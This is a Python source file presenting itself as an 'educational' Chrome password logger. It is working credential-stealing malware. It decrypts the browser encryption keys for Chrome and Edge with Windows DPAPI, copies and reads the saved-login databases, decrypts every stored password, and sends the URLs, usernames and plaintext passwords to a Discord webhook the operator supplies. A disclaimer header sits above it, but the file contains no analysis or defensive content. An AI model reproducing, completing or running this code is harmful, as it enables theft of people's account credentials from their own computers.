# EDUCATIONAL PURPOSES ONLY!
# Credit to https://github.com/USSIndustry/Chrome-Password-Logger [original]
# This is a python file [i used 3.12]
# I AM NOT RESPONSIBLE FOR THE DAMAGES CAUSED
# do not blame me, readme file is there for how to use

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import requests  # For sending data to the webhook

WEBHOOK_URL = "enter webhook here" # Make it ur discord webhook

def getChromeEncryptionKey():
    localStatePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    fallbackStatePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "User Data", "default", "Local State")
    
    # Try the primary path first
    if os.path.exists(localStatePath):
        statePath = localStatePath
    # If primary path fails, use the fallback
    elif os.path.exists(fallbackStatePath):
        statePath = fallbackStatePath
    else:
        raise FileNotFoundError("Local State file not found in the expected locations.")
    
    with open(statePath, "r", encoding="utf-8") as f:
        localState = json.loads(f.read())
    key = base64.b64decode(localState["os_crypt"]["encrypted_key"])
    key = key[5:]  # Removing the "v10" prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def getEdgeEncryptionKey():
    localStatePath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
    
    if not os.path.exists(localStatePath):
        raise FileNotFoundError("Local State file not found for Microsoft Edge.")
    
    with open(localStatePath, "r", encoding="utf-8") as f:
        localState = json.loads(f.read())
    
    key = base64.b64decode(localState["os_crypt"]["encrypted_key"])
    key = key[5:]  # Remove the DPAPI prefix
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decryptPassword(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()
    except:
        try:
            return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
        except:
            return ""

def sendToWebhook(data):
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [data]})
    except Exception as e:
        print(f"Failed to send data to webhook: {e}")

def processCredentials(browser_type, dbPath, key):
    filename = f"{browser_type}Data.db"
    shutil.copyfile(dbPath, filename)
    
    db = sqlite3.connect(filename)
    cursor = db.cursor()
    cursor.execute("select origin_url, action_url, username_value, password_value from logins")
    
    credentials = []
    
    for row in cursor.fetchall():
        originUrl = row[0]
        actionUrl = row[1]
        username = row[2]
        password = decryptPassword(row[3], key)
        
        if username or password:
            credentials.append({
                "title": f"{browser_type} Credentials Extracted",
                "color": 15258703 if browser_type == "Chrome" else 3447003,
                "fields": [
                    {"name": "URL", "value": originUrl, "inline": False},
                    {"name": "Username", "value": username if username else "N/A", "inline": True},
                    {"name": "Password", "value": password if password else "N/A", "inline": True}
                ]
            })
    
    cursor.close()
    db.close()
    os.remove(filename)
    
    return credentials

def main():
    try:
        # Process Chrome credentials
        chrome_key = getChromeEncryptionKey()
        chrome_user_data_dir = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data")
        chrome_found = False
        for profile in os.listdir(chrome_user_data_dir):
            profile_path = os.path.join(chrome_user_data_dir, profile, "Login Data")
            if os.path.exists(profile_path):
                chrome_dbPath = profile_path
                chrome_found = True
                break
        if not chrome_found:
            raise FileNotFoundError("Chrome Login Data file not found in any profile.")
        
        chrome_credentials = processCredentials("Chrome", chrome_dbPath, chrome_key)
        
        # Process Edge credentials
        edge_key = getEdgeEncryptionKey()
        edge_dbPath = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
        
        if not os.path.exists(edge_dbPath):
            raise FileNotFoundError("Edge Login Data file not found.")
        
        edge_credentials = processCredentials("Edge", edge_dbPath, edge_key)
        
        # Combine credentials and send them to webhook
        all_credentials = chrome_credentials + edge_credentials
        if all_credentials:
            for embed_data in all_credentials:
                sendToWebhook(embed_data)
        else:
            sendToWebhook({
                "title": "No Credentials Found",
                "description": "No saved passwords were found for Chrome or Edge.",
                "color": 16711680  # Red
            })
    
    except Exception as e:
        error_embed = {
            "title": "Error Occurred",
            "description": str(e),
            "color": 16711680  # Red
        }
        sendToWebhook(error_embed)

if __name__ == "__main__":
    main()
